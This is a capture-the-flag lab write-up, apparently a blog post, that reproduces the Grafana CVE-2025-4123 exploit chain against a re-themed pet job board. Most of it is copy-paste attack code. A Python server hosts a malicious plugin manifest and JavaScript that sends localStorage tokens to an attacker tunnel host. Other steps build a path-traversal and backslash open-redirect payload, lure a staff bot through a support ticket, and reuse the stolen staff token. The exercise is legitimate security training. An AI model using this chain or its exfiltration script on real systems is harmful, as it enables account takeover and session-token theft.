---
title: "FurHire-013 - (Grafana CVE-2025-4123 Re-Themed)"
date: 2026-07-25
author: Shawn Szczepkowski
---

BugForge's **FurHire-013** lab re-themes **Grafana CVE-2025-4123** (client path traversal → open redirect → malicious plugin manifest → account takeover) as a pet-job-board's "Insights Apps" feature. Same bug class, same exploit shape.

Everything below is copy-paste in order. Replace `$TARGET` with your lab URL and you'll have the flag in about 10 minutes.

```bash
export TARGET="https://your-lab-url.bugforge.io"
```

---

## Step 1 — Register a recruiter account

`role:"recruiter"` is a normal signup choice (like any job board letting employers self-register) — it's just the prerequisite to reach the vulnerable `/apps` page.

```bash
curl -si -X POST $TARGET/api/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"tester1","email":"tester1@test.com","password":"Test1234!","role":"recruiter","full_name":"Tester One"}'
```

Log in and save your token — you'll need it in Step 6:

```bash
curl -si -X POST $TARGET/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"tester1","password":"Test1234!"}'
```

```bash
export TOKEN="<paste token from the login response>"
```

---

## Step 2 — Stand up your attacker server + tunnel

Save this as `catcher.py`:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

EXFIL_LOG = "exfil.log"
ATTACKER_HOST = os.environ["ATTACKER_HOST"]  # set this in your shell before running (Step 2)

class Handler(BaseHTTPRequestHandler):
    def _cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def _handle(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length) if length else b''
        line = f"\n=== {self.command} {self.path} ===\nHeaders: {dict(self.headers)}\n"
        if body:
            line += f"Body: {body[:3000]}\n"
        print(line, flush=True)
        with open(EXFIL_LOG, 'a', encoding='utf-8') as f:
            f.write(line)

        if self.path.startswith('/manifest') or self.path in ('/', ''):
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self._cors()
            self.end_headers()
            self.wfile.write(('{"name":"Evil Widget","module":"https://%s/evil.js"}' % ATTACKER_HOST).encode())
        elif self.path.startswith('/evil.js'):
            self.send_response(200)
            self.send_header('Content-Type', 'application/javascript')
            self._cors()
            self.end_headers()
            js = """
(function(){
  try {
    var token = localStorage.getItem('token');
    var user = localStorage.getItem('user');
    fetch('https://%s/exfil?t=' + encodeURIComponent(token) + '&u=' + encodeURIComponent(user), {mode:'no-cors'});
  } catch(e) {}
})();
""" % ATTACKER_HOST
            self.wfile.write(js.encode())
        else:
            self.send_response(200)
            self._cors()
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'ok')

    def do_GET(self): self._handle()
    def do_POST(self): self._handle()
    def do_PUT(self): self._handle()
    def log_message(self, format, *args): pass

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

> ⚠️ **Use `cloudflared`, not ngrok.** Ngrok's free-tier browser-warning interstitial blocks both the manifest `fetch()` and the injected `<script src>` load — script tags can't send the header that bypasses it. `cloudflared` has no interstitial and just works.
>
> Install it if you don't have it: `winget install --id Cloudflare.cloudflared` (Windows), `brew install cloudflared` (Mac), or `apt install cloudflared` (Debian/Kali).

**Start the tunnel first** (it doesn't need the hostname), then grab your public URL:

```bash
cloudflared tunnel --url http://localhost:8888 > cloudflared.log 2>&1 &
sleep 8
grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' cloudflared.log | head -1
```

Export the hostname (just the host, **no** `https://`), then start the catcher — it reads the host from this env var, so there's nothing to edit inside the file:

```bash
export ATTACKER_HOST="paste-the-hostname-here.trycloudflare.com"
ATTACKER_HOST="$ATTACKER_HOST" python3 catcher.py > catcher.log 2>&1 &
```

Sanity-check that both attacker endpoints answer through the tunnel before continuing:

```bash
curl -s "https://$ATTACKER_HOST/manifest"   # -> {"name":"Evil Widget","module":".../evil.js"}
curl -s "https://$ATTACKER_HOST/evil.js"     # -> the localStorage-exfil snippet
```

If either is empty, re-check that the tunnel is up and `ATTACKER_HOST` is set before moving on.

---

## Step 3 — Build the malicious payload

The Insights Apps loader (`/public/js/apps.js`) takes the `?app=` query param and string-concatenates it straight into a fetch URL — no encoding, no allowlist:

```js
var t = new URLSearchParams(window.location.search).get("app") || "pipeline-insights";
fetch("/api/apps/" + t + "/manifest", ...).then(d => {
  if (d.module) { var s = document.createElement('script'); s.src = d.module; document.body.appendChild(s); }
});
```

Two tricks stacked together get us from that loader to your attacker server:

1. **`../../../../`** cancels the `/api/apps/` prefix and escapes to anywhere on-site.
2. A **`#`** at the end turns everything after it — including the `/manifest` the code always appends — into a URL *fragment*, which the browser strips before sending the request. Without it, the request would always end in `.../manifest` and could never reach `/public/redirect`.

That lands us on `/public/redirect?url=`, which blocks `//`, full URLs, and `%2F%2F` — but not a **literal, non-percent-encoded backslash** right after a `/./`:

```
GET /public/redirect?url=/./\<attacker-host>/manifest
→ 302 Location: //<attacker-host>/manifest
```

Build the payload **entirely in Python** — this is the one place where doing it by hand in bash goes wrong (the `\` + `$var` + `#` mix gets mangled by shell quoting). Python handles the literal backslash cleanly:

```bash
export PAYLOAD=$(ATTACKER_HOST="$ATTACKER_HOST" python3 -c '
import os, urllib.parse
host = os.environ["ATTACKER_HOST"]
raw = "../../../../public/redirect?url=/./\\" + host + "/manifest#"
print(urllib.parse.quote(raw, safe=""))
')
echo "$PAYLOAD"
```

Verify it decodes back to a real backslash before the host (you want to see `\\` in the repr, which is one literal `\`):

```bash
python3 -c "import urllib.parse,sys; print(repr(urllib.parse.unquote(sys.argv[1])))" "$PAYLOAD"
# -> '../../../../public/redirect?url=/./\\<host>/manifest#'
```

Your full malicious URL:

```bash
echo "$TARGET/apps?app=$PAYLOAD"
```

> ⚠️ In the encoded payload the backslash shows up as `%5C`. That's correct — the browser's `URLSearchParams.get("app")` decodes it back to a single literal `\` before building the fetch, which is exactly the byte the redirect bypass needs. Don't try to hand-encode this in bash; use the Python block above.

---

## Step 4 — Test it on yourself first

Open a browser, log into `$TARGET` as `tester1` / `Test1234!` (this puts your token in `localStorage`), then paste the full URL from Step 3 into the address bar and hit enter.

Check your catcher:

```bash
cat exfil.log
```

You should see your own token show up within a couple seconds. If it doesn't, stop here and re-check Steps 2–3 before moving on — don't burn the support-ticket bot on a payload you haven't verified.

---

## Step 5 — Weaponize it against the moderator bot

A backend bot (`moderation_review`, role `staff`) reviews support tickets and visits whatever URL you give it — running your payload with **its** session:

```bash
curl -si -X POST $TARGET/api/support/tickets \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"url\":\"/apps?app=$PAYLOAD\",\"description\":\"posting looks broken, can a mod check?\"}"
```

The bot usually visits within a minute (give it up to 2). Watch for a **second, different** token to appear — that's the staff bot's:

```bash
# poll until a token that isn't yours shows up
for i in $(seq 1 8); do
  grep -oE '/exfil\?t=[^&]+' exfil.log | sort -u
  echo "--- waited ~$((i*15))s ---"
  sleep 15
done
```

```bash
export STAFF_TOKEN="<paste the staff token from exfil.log>"
```

---

## Step 6 — Get the flag (it's in a header, not the body)

```bash
curl -si $TARGET/api/my-jobs -H "Authorization: Bearer $STAFF_TOKEN"
```

The body will show a normal-looking `403 {"error":"Only recruiters can access this"}` — the staff role still isn't a recruiter, so that's expected. **Look at the response headers.** `-si` prints them, and the flag is sitting right there in `X-Flag`.

That's the chain: register → traversal + fragment trick → backslash redirect bypass → host a fake plugin manifest → bait the mod bot via a support ticket → read the flag off a "failed" request's headers.
